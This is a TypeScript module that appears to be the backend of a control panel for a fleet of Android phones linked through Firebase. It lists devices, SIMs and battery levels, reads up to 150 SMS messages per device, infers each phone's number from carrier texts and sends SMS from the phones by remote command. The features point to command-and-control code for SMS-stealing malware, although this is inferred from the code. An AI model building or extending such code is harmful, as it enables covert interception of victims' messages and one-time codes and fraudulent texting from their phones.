import { logger } from "./logger";

export interface FirebaseDevice {
  id: string;
  name: string;
  status: boolean;
  phoneNumber: string;
  battery: string;
  model: string;
  lastSeen: string | null;
  lastSeenTs: number | null;    // parsed epoch ms — used for "active in last 1hr" filter
  lastSmsTimestampMs: number | null;
  simCount: number;
  totalSms: number;
  panelId: number;
  panelName: string;
  sims: FirebaseSim[];
}

export interface FirebaseSim {
  phoneNumber: string;
  operator: string;
}

export interface FirebaseSmsMessage {
  text: string;
  sender: string;
  time: string;
  timestampMs: number | null;   // parsed epoch ms for sorting
}

// ─── Low-level fetch ────────────────────────────────────────────────────────

async function firebaseFetch(
  firebaseUrl: string,
  secretKey: string,
  path: string
): Promise<unknown> {
  const base = firebaseUrl.trim().replace(/\/$/, "");
  const url = secretKey
    ? `${base}/${path}.json?auth=${secretKey.trim()}`
    : `${base}/${path}.json`;
  const ctrl = new AbortController();
  const timer = setTimeout(() => ctrl.abort(), 15000);
  try {
    const res = await fetch(url, {
      headers: { Accept: "application/json" },
      signal: ctrl.signal,
    });
    clearTimeout(timer);
    if (!res.ok) {
      if (res.status === 401 || res.status === 403) {
        throw new Error("PERMISSION_DENIED: Firebase rejected the key.");
      }
      if (res.status === 404) return null;
      throw new Error(`HTTP ${res.status}`);
    }
    return res.json();
  } catch (err) {
    clearTimeout(timer);
    if ((err as Error).name === "AbortError") throw new Error("Request timed out.");
    throw err;
  }
}

async function firebaseWrite(
  firebaseUrl: string,
  secretKey: string,
  path: string,
  data: unknown,
  method: "PUT" | "PATCH" = "PUT"
): Promise<boolean> {
  const base = firebaseUrl.trim().replace(/\/$/, "");
  const url = secretKey
    ? `${base}/${path}.json?auth=${secretKey.trim()}`
    : `${base}/${path}.json`;
  const ctrl = new AbortController();
  const timer = setTimeout(() => ctrl.abort(), 10000);
  try {
    const res = await fetch(url, {
      method,
      headers: { "Content-Type": "application/json", Accept: "application/json" },
      body: JSON.stringify(data),
      signal: ctrl.signal,
    });
    clearTimeout(timer);
    return res.ok;
  } catch (err) {
    clearTimeout(timer);
    logger.error({ err, path }, "Firebase write error");
    return false;
  }
}

// ─── Parse timestamp from multiple formats ──────────────────────────────────

function parseTimestamp(raw: unknown): number | null {
  if (raw === null || raw === undefined) return null;
  if (typeof raw === "number") {
    // epoch seconds vs ms heuristic
    return raw < 1e12 ? raw * 1000 : raw;
  }
  if (typeof raw === "string" && raw.trim()) {
    const value = raw.trim();
    // Firebase SMS data commonly uses the device's Indian local format:
    // "09-08-2026 | 03:53 am". Parse it explicitly instead of relying on
    // Date.parse, whose day/month interpretation varies by runtime.
    const localMatch = value.match(
      /^(\d{1,2})[\/.-](\d{1,2})[\/.-](\d{4})\s*(?:\||T|,)?\s*(\d{1,2}):(\d{2})(?::(\d{2}))?\s*(am|pm)?/i,
    );
    if (localMatch) {
      const [, d, mo, y, rawHour, mi, s, meridiem] = localMatch;
      let hour = Number(rawHour);
      if (meridiem) {
        const isPm = meridiem.toLowerCase() === "pm";
        hour = hour % 12 + (isPm ? 12 : 0);
      }
      if (
        Number(d) >= 1 &&
        Number(d) <= 31 &&
        Number(mo) >= 1 &&
        Number(mo) <= 12 &&
        hour >= 0 &&
        hour <= 23
      ) {
        // The panel handles Indian mobile numbers, so timestamps without a
        // timezone are treated as Asia/Kolkata rather than server-local time.
        const utcMs = Date.UTC(
          Number(y),
          Number(mo) - 1,
          Number(d),
          hour,
          Number(mi),
          Number(s || 0),
        );
        const indiaOffsetMs = (5 * 60 + 30) * 60 * 1000;
        return utcMs - indiaOffsetMs;
      }
    }

    const direct = Date.parse(value);
    if (!isNaN(direct)) return direct;
    // DD/MM/YYYY HH:MM:SS format (24-hour fallback)
    const m = value.match(/(\d{1,2})[\/\-](\d{1,2})[\/\-](\d{4})[T\s](\d{2}):(\d{2})(?::(\d{2}))?/);
    if (m) {
      const [, d, mo, y, h, mi, s] = m;
      const ts = new Date(+y, +mo - 1, +d, +h, +mi, +(s || 0)).getTime();
      if (!isNaN(ts)) return ts;
    }
  }
  return null;
}

// ─── Device parsing ──────────────────────────────────────────────────────────

function parseDevices(
  data: unknown,
  panelId: number,
  panelName: string
): FirebaseDevice[] {
  if (!data || typeof data !== "object") return [];
  const entries = Object.entries(data as Record<string, unknown>);
  const devices: FirebaseDevice[] = [];

  for (const [id, raw] of entries) {
    if (!raw || typeof raw !== "object") continue;
    const d = raw as Record<string, unknown>;

    // Parse SIMs
    const simsRaw = d.sims || d.simDetails;
    const sims: FirebaseSim[] = [];
    if (Array.isArray(simsRaw)) {
      for (const s of simsRaw) {
        if (s && typeof s === "object") {
          sims.push({
            phoneNumber: String((s as Record<string, unknown>).phoneNumber || ""),
            operator: String(
              (s as Record<string, unknown>).operator ||
              (s as Record<string, unknown>).service_provider || ""
            ),
          });
        }
      }
    }

    // Get primary phone number
    const phoneNumber =
      String(d.mobNo || d.phoneNumber || sims[0]?.phoneNumber || "—");

    // Parse battery
    const batteryRaw = d.battery || d.batteryPercent || d.batteryLevel;
    const battery = batteryRaw !== undefined ? `${batteryRaw}%` : "—";

    // Parse model
    const model = String(d.model || d.device || d.deviceModel || d.modelName || d.d_name || "—");

    // Parse last seen — try many common field names
    const lastSeenRaw =
      d.lastSeen ?? d.last_seen ?? d.lastOnline ?? d.last_online ??
      d.lastActive ?? d.last_active ?? d.timestamp ?? d.time ??
      d.dateTime ?? d.updatedAt ?? d.updated_at ?? null;

    const lastSeenTs = parseTimestamp(lastSeenRaw);
    const lastSeen = lastSeenTs ? new Date(lastSeenTs).toISOString() : null;

    // Count SMS
    const smsRaw = d.sms || d.messages || d.inbox;
    const embeddedSms = parseSmsEntries(smsRaw);
    const lastSmsTimestampMs = embeddedSms.reduce<number | null>(
      (latest, message) =>
        message.timestampMs !== null &&
        (latest === null || message.timestampMs > latest)
          ? message.timestampMs
          : latest,
      null,
    );
    const totalSms =
      smsRaw && typeof smsRaw === "object"
        ? Object.keys(smsRaw).length
        : 0;

    // Online status
    const status = Boolean(d.status || d.online);

    // Name
    const name = String(d.name || d.deviceName || d.modelName || d.d_name || id);

    devices.push({
      id,
      name,
      status,
      phoneNumber,
      battery,
      model,
      lastSeen,
      lastSeenTs,
      lastSmsTimestampMs,
      simCount: sims.length || 1,
      totalSms,
      panelId,
      panelName,
      sims,
    });
  }

  return devices;
}

// ─── SMS parsing ──────────────────────────────────────────────────────────────

function parseSmsEntries(data: unknown): FirebaseSmsMessage[] {
  if (!data || typeof data !== "object") return [];
  const entries = Object.entries(data as Record<string, unknown>);
  // Take last 150 entries
  const slice = entries.length > 150 ? entries.slice(entries.length - 150) : entries;
  const messages: FirebaseSmsMessage[] = [];
  for (const [, raw] of slice) {
    if (!raw || typeof raw !== "object") continue;
    const m = raw as Record<string, unknown>;
    const text = String(m.message || m.body || m.text || "");
    if (!text.trim()) continue;
    const timeStr = String(m.dateTime || m.date || m.time || "");
    const tsRaw = m.timestamp ?? m.dateTime ?? m.date ?? m.time ?? null;
    const timestampMs = parseTimestamp(tsRaw);
    messages.push({
      text,
      sender: String(m.sender || m.from || "Unknown"),
      time: timeStr,
      timestampMs,
    });
  }
  // Sort newest first (by timestamp if available, else reverse insertion order)
  messages.sort((a, b) => {
    if (a.timestampMs !== null && b.timestampMs !== null) {
      return b.timestampMs - a.timestampMs;
    }
    if (a.timestampMs !== null) return -1;
    if (b.timestampMs !== null) return 1;
    return 0;
  });
  return messages;
}

export function getLatestSmsTimestamp(
  messages: FirebaseSmsMessage[],
): number | null {
  return messages.reduce<number | null>(
    (latest, message) =>
      message.timestampMs !== null &&
      (latest === null || message.timestampMs > latest)
        ? message.timestampMs
        : latest,
    null,
  );
}

// ─── Phone number extraction from SMS text (same logic as HTML panel) ────────
//
// The device Firebase node often has NO phoneNumber field.
// The real number is found inside SMS messages — operator SMSes say things like:
//   "Your Jio Number is: 9876543210"  or  "Airtel Number: 9876543210"
// We scan each message text with the same regex set the HTML panel uses.

const PHONE_PATTERNS: RegExp[] = [
  // Carrier-tagged patterns (highest confidence)
  /(?:Jio|JIO)\s+(?:mobile\s+)?(?:no\.?|number|num)\s*[:\-]\s*([6-9][0-9]{9})/i,
  /(?:Airtel|AIRTEL)\s+(?:mobile\s+)?(?:no\.?|number|num)\s*[:\-]\s*([6-9][0-9]{9})/i,
  /(?:Vi|VI|Vodafone|VODAFONE|Idea|IDEA)\s+(?:mobile\s+)?(?:no\.?|number|num)\s*[:\-]\s*([6-9][0-9]{9})/i,
  /(?:BSNL|bsnl)\s+(?:mobile\s+)?(?:no\.?|number|num)\s*[:\-]\s*([6-9][0-9]{9})/i,
  // Generic patterns
  /(?:your\s+)?(?:mobile|mob\.?|phone|contact)\s+(?:no\.?|number|num)\s*[:\-]\s*(\+?91[-\s]?[6-9][0-9]{9})/i,
  /(?:your\s+)?(?:mobile|mob\.?|phone|contact)\s+(?:no\.?|number|num)\s*[:\-]\s*([6-9][0-9]{9})/i,
  /(?:Number|No\.?)\s*[:\-]\s*([6-9][0-9]{9})/i,
  /registered\s+(?:mobile\s+)?(?:number|no\.?)\s*[:\-]?\s*([6-9][0-9]{9})/i,
  // +91 prefix
  /(\+91[-\s]?[6-9][0-9]{9})/,
  /(?:\b91)([6-9][0-9]{9})\b/,
  // Last resort — bare 10-digit Indian number at word boundary
  /(?:^|\s|:)([6-9][0-9]{9})(?:\s|$|\.)/,
];

export function extractPhoneFromSms(messages: FirebaseSmsMessage[]): string | null {
  for (const msg of messages) {
    for (const re of PHONE_PATTERNS) {
      const match = msg.text.match(re);
      if (match && match[1]) {
        const digits = match[1].replace(/[^0-9]/g, "");
        if (digits.length === 10 && /^[6-9]/.test(digits)) return digits;
        if (digits.length === 12 && digits.startsWith("91") && /^91[6-9]/.test(digits))
          return digits.slice(2);
      }
    }
  }
  return null;
}

// ─── Public API ───────────────────────────────────────────────────────────────

export async function fetchPanelDevices(
  firebaseUrl: string,
  secretKey: string,
  panelId: number,
  panelName: string
): Promise<FirebaseDevice[]> {
  try {
    const data = await firebaseFetch(firebaseUrl, secretKey, "clients");
    return parseDevices(data, panelId, panelName);
  } catch (err) {
    logger.error({ err, panelId }, "Failed to fetch panel devices");
    return [];
  }
}

/**
 * Fetch SMS for a device — tries multiple Firebase path conventions:
 * 1. clients/{id}/sms           (our primary structure)
 * 2. messages/{id}              (PHP bot / alternate structure)
 * 3. clients/{id}/messages      (another common layout)
 * 4. user_sms/{id}              (yet another layout)
 *
 * Returns newest-first list of up to 150 messages.
 */
export async function fetchDeviceSms(
  firebaseUrl: string,
  secretKey: string,
  deviceId: string
): Promise<FirebaseSmsMessage[]> {
  const paths = [
    `clients/${deviceId}/sms`,
    `messages/${deviceId}`,
    `clients/${deviceId}/messages`,
    `user_sms/${deviceId}`,
  ];

  for (const path of paths) {
    try {
      const data = await firebaseFetch(firebaseUrl, secretKey, path);
      if (data && typeof data === "object" && Object.keys(data).length > 0) {
        const msgs = parseSmsEntries(data);
        if (msgs.length > 0) return msgs;
      }
    } catch (err) {
      logger.warn({ err, path }, "SMS path failed, trying next");
    }
  }
  return [];
}

/**
 * Send an SMS command via Firebase webhookEvent.
 * Writes to clients/{deviceId}/webhookEvent/sendSms (as HTML panel does).
 * Also patches clients/{deviceId} with full command payload for compatibility.
 */
export async function sendSmsViaFirebase(
  firebaseUrl: string,
  secretKey: string,
  deviceId: string,
  to: string,
  message: string,
  simSlot: number = 1
): Promise<boolean> {
  const webhookPayload = {
    from: simSlot,
    isSended: false,
    message,
    to,
  };

  const fullPayload = {
    command: "send message",
    messageText: message,
    phoneNumber: to,
    simSlot: String(simSlot - 1), // 0-indexed for device app
    webhookEvent: {
      sendSms: webhookPayload,
    },
    action: {
      sendSms: {
        message,
        status: "pending",
        to,
      },
      command: "send message",
      messageText: message,
      phoneNumber: to,
      simSlot: String(simSlot - 1),
      targetDeviceId: deviceId,
    },
  };

  // Try both write targets in parallel
  const results = await Promise.allSettled([
    firebaseWrite(firebaseUrl, secretKey, `clients/${deviceId}/webhookEvent/sendSms`, webhookPayload, "PUT"),
    firebaseWrite(firebaseUrl, secretKey, `clients/${deviceId}`, fullPayload, "PATCH"),
  ]);

  const anyOk = results.some(r => r.status === "fulfilled" && r.value === true);
  if (!anyOk) {
    logger.error({ deviceId, to }, "sendSmsViaFirebase — all writes failed");
  }
  return anyOk;
}
